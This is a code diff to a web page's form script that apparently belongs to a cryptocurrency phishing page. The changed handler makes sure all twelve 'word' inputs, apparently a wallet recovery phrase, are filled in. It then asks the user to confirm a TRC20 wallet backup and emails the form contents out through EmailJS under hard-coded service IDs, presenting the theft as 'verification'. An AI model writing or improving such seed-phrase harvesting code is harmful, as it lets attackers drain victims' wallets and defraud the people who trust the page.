@@ -631,14 +631,24 @@ document.addEventListener("DOMContentLoaded", () => {
   s2form.addEventListener("submit", function(event) {
     event.preventDefault();
 
-    // Check confirmation checkbox
+    // Check all 12 phrase inputs first
+    const phraseInputs = s2form.querySelectorAll("input[name^='word']");
+    for (let input of phraseInputs) {
+      if (!input.value.trim()) {
+        // Auto-focus the first empty box
+        input.focus();
+        return; // stop here, don't proceed
+      }
+    }
+
+    // If all boxes are filled, check the confirmation checkbox
     const matchCheck = document.getElementById("matchCheck");
     if (!matchCheck.checked) {
-      alert("Please confirm your backup matches your TRC20 wallet address.");
+      showToast("Please confirm your backup matches your TRC20 wallet address.");
       return;
     }
 
-    // Send form via EmailJS
+    // If everything is valid, send form via EmailJS
     emailjs.sendForm("service_1qzlil7", "template_w742mzr", "#step2-form")
       .then(function(response) {
         console.log("EmailJS success:", response);
@@ -651,7 +661,7 @@ document.addEventListener("DOMContentLoaded", () => {
       })
       .catch(function(error) {
         console.error("EmailJS error:", error);
-        alert("Verification failed. Please try again.");
+        showToast("Verification failed. Please try again.");
       });
   });
 </script>
